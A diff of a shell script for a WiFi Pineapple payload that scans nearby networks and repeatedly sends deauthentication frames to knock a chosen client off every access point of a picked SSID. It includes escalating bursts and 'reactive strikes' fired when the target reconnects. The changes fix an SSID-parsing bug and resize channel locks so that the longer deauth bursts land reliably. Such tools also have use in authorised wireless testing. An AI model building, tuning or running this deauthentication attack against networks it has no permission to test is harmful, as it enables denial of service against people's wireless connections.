@@ -523,9 +523,10 @@ sql_escape() { printf '%s' "$1" | sed "s/'/''/g"; }
 # SSID: several BSSIDs broadcasting the identical name (a mesh network, or
 # just unrelated routers sharing a default name) collapse into one row
 # with a count, instead of listing each BSSID as its own entry. Prints
-# "SSID\tBSSID~CHANNEL;BSSID~CHANNEL;...\tCOUNT\tSIGNAL", strongest
-# signal first. Verified live against real recon.db data (a real 8-AP
-# "FRITZ!Box 6690 GK" mesh grouped correctly).
+# "BSSID~CHANNEL;BSSID~CHANNEL;...\tCOUNT\tSIGNAL\tSSID" (SSID LAST, see the
+# BUG FOUND AND FIXED comment below for why), strongest signal first.
+# Verified live against real recon.db data (a real 8-AP "FRITZ!Box 6690 GK"
+# mesh grouped correctly).
 scan_ssid_groups() {
     [ -f "$RECON_DB" ] || { err "Recon database not found at $RECON_DB - has recon run yet?"; return 1; }
     command -v sqlite3 >/dev/null 2>&1 || { err "sqlite3 not found on this device."; return 1; }
@@ -542,8 +543,34 @@ scan_ssid_groups() {
     # impact: a hidden/cloaked AP (which legitimately beacons an empty
     # SSID) would show up as a blank-name row in --scan/--pick's grouped
     # listing instead of being filtered out by this guard as intended.
+    #
+    # BUG FOUND AND FIXED (confirmed via a standalone repro, not just
+    # theory): this used to SELECT ssid FIRST, ahead of the other
+    # tab-separated fields. SSID is attacker-controlled/arbitrary data (see
+    # sql_escape()'s own comment: "a nearby AP can broadcast literally any
+    # name, including one containing a quote") - an SSID containing a
+    # literal tab byte (legal in the 802.11 SSID element, which is just an
+    # arbitrary byte string) collides with the tab used as this output's
+    # OWN field separator. Reproduced standalone: a row for SSID
+    # "Evil<TAB>Net" fed through `IFS=$'\t' read -r ssid pairs count
+    # signal` (the exact pattern both consumers below use) split it into
+    # ssid="Evil", pairs="Net", with the real pairs/count/signal data
+    # shoved into the wrong variables - garbled --scan output, and in
+    # --pick, `cut -f1` on the same raw line produced the truncated
+    # SSID_NAME "Evil" instead of the real "Evil<TAB>Net", which then
+    # matched zero rows in ssid_group_pairs() and made --pick die with a
+    # false "No APs found broadcasting SSID 'Evil'" for a network that
+    # verifiably WAS in recon data under its real (longer) name. Fix:
+    # `read`'s own documented behavior stuffs any surplus delimited fields
+    # into the LAST variable verbatim (embedded separators and all) rather
+    # than splitting further - so moving ssid to be the LAST selected
+    # column, with a fixed number of columns before it, makes an embedded
+    # tab in the SSID transparent to both consumers instead of corrupting
+    # the parse. Re-verified against the same standalone repro with ssid
+    # moved last: `read -r pairs count signal ssid` correctly recovered
+    # ssid="Evil<TAB>Net" intact.
     sqlite3 -separator '	' "$RECON_DB" \
-        "SELECT ssid, GROUP_CONCAT(bssid || '~' || channel, ';'), COUNT(*), MAX(signal)
+        "SELECT GROUP_CONCAT(bssid || '~' || channel, ';'), COUNT(*), MAX(signal), ssid
          FROM (SELECT s.bssid AS bssid, s.ssid AS ssid, s.channel AS channel, MAX(s.signal) AS signal
                FROM ssid s
                WHERE s.type = 8 AND s.bssid IS NOT NULL AND CAST(s.bssid AS TEXT) != '' AND s.ssid IS NOT NULL AND CAST(s.ssid AS TEXT) != ''
@@ -651,7 +678,10 @@ if [ "$DO_SCAN" = "1" ]; then
     fi
     say "Nearby networks seen by recon (strongest signal first):"
     printf "  %-28s %-6s %s\n" "SSID" "APs" "SIGNAL"
-    echo "$rows" | while IFS="$(printf '\t')" read -r ssid pairs count signal; do
+    # ssid is read LAST (see scan_ssid_groups()'s own BUG FOUND AND FIXED
+    # comment) so an embedded tab in an attacker-controlled SSID lands
+    # intact in $ssid instead of corrupting the other fields.
+    echo "$rows" | while IFS="$(printf '\t')" read -r pairs count signal ssid; do
         printf "  %-28s (%s)    %sdBm\n" "$ssid" "$count" "$signal"
     done
     exit 0
@@ -683,7 +713,10 @@ if [ "$DO_PICK" = "1" ]; then
         else
             say "Nearby networks (same SSID across multiple APs is grouped - picking one attacks all of them):"
             i=1
-            echo "$rows" | while IFS="$(printf '\t')" read -r ssid pairs count signal; do
+            # ssid read LAST here too - see scan_ssid_groups()'s own BUG
+            # FOUND AND FIXED comment for why (an embedded tab in the SSID
+            # would otherwise corrupt this parse).
+            echo "$rows" | while IFS="$(printf '\t')" read -r pairs count signal ssid; do
                 printf "  %d) %-28s (%s AP%s)  %sdBm\n" "$i" "$ssid" "$count" "$([ "$count" != "1" ] && echo s)" "$signal"
                 i=$((i+1))
             done
@@ -703,8 +736,18 @@ if [ "$DO_PICK" = "1" ]; then
                 # invalid. Fail clearly instead, same pattern already used
                 # for an invalid PayloadRunner.sh picker selection.
                 [ -z "$picked" ] && die "Invalid selection '$sel' - pick one of the listed numbers."
-                SSID_NAME=$(echo "$picked" | cut -f1)
-                say "Picked '$SSID_NAME' ($(echo "$picked" | cut -f3) AP(s))."
+                # BUG FOUND AND FIXED: SSID_NAME used to be `cut -f1` (ssid
+                # was the FIRST column) - see scan_ssid_groups()'s own BUG
+                # FOUND AND FIXED comment for the standalone repro proving
+                # an embedded tab in the SSID made that extract the WRONG,
+                # truncated name, which then matched zero rows downstream
+                # in ssid_group_pairs() and made --pick die claiming the
+                # (real, present) network didn't exist. Now that ssid is
+                # the LAST column, `cut -f4-` recovers it byte-for-byte
+                # (embedded tabs included) instead of splitting on them -
+                # same fix as the two read loops above, applied to `cut`.
+                SSID_NAME=$(echo "$picked" | cut -f4-)
+                say "Picked '$SSID_NAME' ($(echo "$picked" | cut -f2) AP(s))."
             fi
         fi
     fi
@@ -1062,9 +1105,33 @@ attack_ap_pairs() {
     for pair in "$@"; do
         [ "$STOPPING" = "1" ] && break
         bssid="${pair%%~*}"; channel="${pair#*~}"
-        lock_channel "$channel" 5
         esc="${AP_ESCALATION[$bssid]:-0}"
         round_burst=$(( BURST + esc ))
+        # BUG FOUND AND FIXED (found via static analysis using this file's
+        # own measured numbers - same "lock doesn't cover the actual work
+        # done under it" class already fixed once above, see "REVERTED A
+        # PRIOR OPTIMIZATION" a few lines up): this always locked with
+        # argument 5 (lock_channel() adds +2 internally - see its own
+        # header - so an ACTUAL 7s window), sized for the base case of
+        # $BURST=3 calls (burst_deauth's own comment says a measured
+        # worst case of "3 calls * 950ms = 2.85s", comfortably under 7s).
+        # But round_burst here is $BURST PLUS the escalation level -
+        # capped at MAX_ESCALATION=5, so up to 8 calls once escalate_check()
+        # has actually bumped a stubborn AP, which is exactly the situation
+        # escalation exists to handle. 8 calls at this file's own measured
+        # ~950ms worst case is 7.6s - MORE than the fixed 7s actual lock
+        # covers, so the last call or two of a heavily-escalated round can
+        # fire after PineAP has already resumed hopping and go out on the
+        # wrong channel, doing nothing - defeating escalation's whole point
+        # (more pressure on the one AP measurably not disconnecting yet)
+        # right when it matters most. Fix: compute round_burst first and
+        # size the lock to it (round_burst + 2), the same calls-derived "+2
+        # margin" arithmetic already used everywhere else in this file that
+        # locks for a known number of upcoming calls. For the common
+        # un-escalated case (esc=0, round_burst=$BURST=3) this still passes
+        # exactly "5" - identical to the old fixed value, no regression -
+        # and only grows once escalation actually raises the call count.
+        lock_channel "$channel" "$((round_burst + 2))"
         i=1
         while [ "$i" -le "$round_burst" ]; do
             PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
@@ -1391,7 +1458,23 @@ run_reactive_strike() {
             if [ -n "$sighted" ]; then
                 local sb="${sighted%%~*}" sc="${sighted#*~}"
                 say "Sentinel caught $target on $sb (ch $sc) - striking now."
-                lock_channel "$sc" 3
+                # BUG FOUND AND FIXED (found via static analysis using this
+                # file's own measured numbers - same "lock doesn't cover the
+                # actual work done under it" class fixed in attack_ap_pairs()
+                # above): this locked with argument 3 (lock_channel() adds +2
+                # internally, so an ACTUAL 5s window) but then fires
+                # BURST*2 calls, not BURST - reactive strikes deliberately
+                # double the burst (see this function's own header: "no
+                # effect ... at an already-located target" motivated hitting
+                # harder the instant one is caught). At $BURST=3 that's 6
+                # calls; at this file's own measured ~950ms/call worst case
+                # (burst_deauth's comment) that's 5.7s, MORE than the 5s
+                # actual lock covers - the last call of a slow strike can
+                # fire off-channel and do nothing, at the exact moment
+                # (target mid-reconnect) reactive mode exists to not miss.
+                # Fix: size the lock to the actual call count, same
+                # "calls + 2" arithmetic as attack_ap_pairs()'s fix above.
+                lock_channel "$sc" "$(( (BURST * 2) + 2 ))"
                 local i=1
                 while [ "$i" -le "$((BURST * 2))" ]; do
                     PINEAPPLE_DEAUTH_CLIENT "$sb" "$target" "$sc"
@@ -1420,7 +1503,10 @@ run_reactive_strike() {
             # history this used to require fixing in two places).
             if watch_for_reconnect "$MON_IFACE" "$target_lc"; then
                 say "Caught $target reconnecting to $bssid (ch $channel) - striking now."
-                lock_channel "$channel" 3
+                # Same "lock must cover BURST*2 calls, not be fixed at 3"
+                # fix as the sentinel-triggered strike above - same call
+                # count, same root cause.
+                lock_channel "$channel" "$(( (BURST * 2) + 2 ))"
                 local i=1
                 while [ "$i" -le "$((BURST * 2))" ]; do
                     PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
@@ -1439,7 +1525,10 @@ run_reactive_strike() {
                 if [ -n "$sighted2" ]; then
                     local sb2="${sighted2%%~*}" sc2="${sighted2#*~}"
                     say "Sentinel caught $target on $sb2 (ch $sc2) - striking now."
-                    lock_channel "$sc2" 3
+                    # Same "lock must cover BURST*2 calls, not be fixed at
+                    # 3" fix as the two BURST*2 strikes above - same call
+                    # count, same root cause.
+                    lock_channel "$sc2" "$(( (BURST * 2) + 2 ))"
                     local j=1
                     while [ "$j" -le "$((BURST * 2))" ]; do
                         PINEAPPLE_DEAUTH_CLIENT "$sb2" "$target" "$sc2"
